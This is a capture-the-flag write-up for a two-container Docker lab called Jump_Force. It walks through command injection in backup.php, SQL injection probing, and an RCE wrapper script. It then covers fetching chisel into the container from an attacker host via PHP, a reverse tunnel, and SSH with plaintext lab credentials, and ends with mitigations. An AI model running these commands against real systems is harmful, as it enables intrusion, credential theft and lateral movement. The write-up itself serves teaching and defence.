---
layout: post
title: "Jump_Force — TFM CTF"
description: "Command injection, SQL injection, acceso a MariaDB y pivoting entre contenedores con túnel inverso chisel."
categories: [machines]
tags: [tfm, sqli, pivoting, chisel]
author: "Enrique Álvarez González"
---

---

> This is the most complex machine in the lab. Two containers on an internal Docker network — `jump_force_one` exposes services, `jump_force_two` is completely hidden. Getting the second flag requires pivoting through the first container using a reverse tunnel.

## Recon

```bash
sudo docker-compose up -d && sudo docker ps
nmap -p- --open -sT -T3 -v -n TARGET_IP
nmap -sT -sV -sC -p 5000 -n -Pn TARGET_IP
```

One exposed port: **5000 — HTTP (Apache 2.4.25 Debian, December 2016).** Very old version, multiple known CVEs, no direct pre-auth exploit here.

---

## Enumeration

Root page from the CTF author: *"soy una vulnerabilidad? soy dos vulnerabilidades? soy tres..."*

```bash
gobuster dir -u http://TARGET_IP:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,old,cgi,sh -t 40
```

Four resources: `index.php`, `index.html.bak` (backup in web root), `backup.php` (fields named `command1` and `command2` — red flag), `password.php` (accepts `id` parameter).

---

## Vulnerability Analysis

### Command Injection in `backup.php`

```bash
# Baseline
curl -s -X POST -d "response=Y&command1=2&command2=3" http://TARGET_IP:5000/backup.php
# La suma es: 5

# Injection
curl -s -X POST \
  --data-urlencode "response=Y" \
  --data-urlencode "command1=2; id; echo" \
  --data-urlencode "command2=3" \
  http://TARGET_IP:5000/backup.php
```

> `--data-urlencode` URL-encodes the `;` properly. Plain `-d` would not.

RCE confirmed as `www-data`.

### SQL Injection in `password.php`

```bash
curl -s "http://TARGET_IP:5000/password.php?id=1'"   # MariaDB syntax error

for n in 1 2 3 4 5 6; do
  cols=$(seq -s, 1 $n)
  curl -s "http://TARGET_IP:5000/password.php?id=0' UNION SELECT $cols-- -"
done
# n=2 returns valid → two printable columns
```

---

## Exploitation — first flag

### RCE wrapper script

```bash
#!/bin/bash
CMD="$1"
URL="http://TARGET_IP:5000/backup.php"
curl -s -X POST \
  --data-urlencode "response=Y" \
  --data-urlencode "command1=2; $CMD; echo" \
  --data-urlencode "command2=3" \
  "$URL"
echo
```

```bash
chmod +x rce.sh
./rce.sh "cat /var/www/html/backup.php"   # shell_exec() + no sanitisation → CWE-78
./rce.sh "cat /var/www/html/password.php" # hardcoded creds (poc:1234) → CWE-798

./rce.sh "mysql -u poc -p1234 -e 'USE poc; SELECT * FROM flags;'"
```

```
Flag 1: 003d873449f8e8ff13b72f2061bfbaa4e5a84b82
```

---

## Pivoting to Jump_Force_Two — second flag

### Recon from inside jump_force_one

No `nmap` or `netcat` — using bash's `/dev/tcp` built-in:

```bash
./rce.sh "for p in 21 22 25 80 443 2222 3306 5000 8080 8443; do
  timeout 1 bash -c \"</dev/tcp/172.18.0.2/\$p\" 2>/dev/null && echo \"port \$p open\"
done"
```

Network: `jump_force_one` at `172.18.0.3`, `jump_force_two` at `172.18.0.2`. Only open port: **2222 (SSH)**.

```bash
./rce.sh "mysql -u poc -p1234 -e 'USE poc; SELECT * FROM users;'"
# six username/password pairs in plaintext
```

### Why chisel — understanding the reverse tunnel

The problem: `jump_force_two` has no exposed ports — unreachable directly from Kali. `jump_force_one` can reach it via the internal network, but only through a web shell.

**Solution:** reverse port forward — `jump_force_one` connects *outward* to Kali, which opens a local port forwarding traffic back to `jump_force_two:2222`.

### Building the tunnel

```bash
# Kali: download and serve chisel
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz && mv chisel_1.10.1_linux_amd64 chisel && chmod +x chisel
python3 -m http.server 8000

# Transfer to jump_force_one (no wget/curl — using PHP)
./rce.sh "php -r 'file_put_contents(\"/tmp/chisel\", file_get_contents(\"http://KALI_IP:8000/chisel\"));'"
./rce.sh "chmod +x /tmp/chisel"

# Chisel server on Kali
/tmp/chisel server --port 9001 --reverse --host 0.0.0.0

# Chisel client from jump_force_one
./rce.sh 'echo "nohup /tmp/chisel client KALI_IP:9001 R:2222:172.18.0.2:2222 \
> /tmp/chisel.log 2>&1 &" > /tmp/runchisel.sh && chmod +x /tmp/runchisel.sh'
./rce.sh "/tmp/runchisel.sh & disown; sleep 2"
```

`R:2222:172.18.0.2:2222` — *"open port 2222 on Kali and forward traffic through me to 172.18.0.2:2222"*.

> `nohup` + `disown` detaches chisel from the PHP parent. Without this it dies when the request ends.

### SSH into jump_force_two

```bash
sshpass -p 'tefeme.!' ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -p 2222 pablo@127.0.0.1 \
  'whoami; id; cat .flag.txt'
```

```
Flag 2: 4d8c72671245d9d1b8e03a826db9d5ecead28c8c
```

Full chain: backup disclosure → command injection → database access → credential extraction → reverse tunnel → SSH lateral movement.

---

## Vulnerability Summary

| ID | Vulnerability | CWE | CVSS v3.1 |
|---|---|---|---|
| V1 | Backup File Disclosure (`index.html.bak`) | CWE-530 | — |
| V2 | Command Injection in `backup.php` | CWE-78 | — |
| V3 | SQL Injection in `password.php` | CWE-89 | — |
| V4 | Hardcoded credentials in `password.php` | CWE-798 | — |
| V5 | Plaintext password storage in `users` table | CWE-256 | — |
| V6 | `privileged: true` in `docker-compose.yml` | — | — |

---

## Mitigations

**V1:** Remove backup files from web root.

**V2:** Replace `shell_exec()` with native PHP arithmetic. Use `is_numeric()` + `escapeshellarg()` as fallback.

**V3:** Use prepared statements:
```php
$stmt = $mysqli->prepare("SELECT id, frase FROM frases WHERE id = ?");
$stmt->bind_param("i", $id);
```

**V4:** Move credentials to environment variables or Docker Secrets.

**V5:** Hash with `argon2id` — this single fix would have broken the entire lateral movement chain.

**V6:** Remove `privileged: true`. Use `cap_add`/`cap_drop` instead.
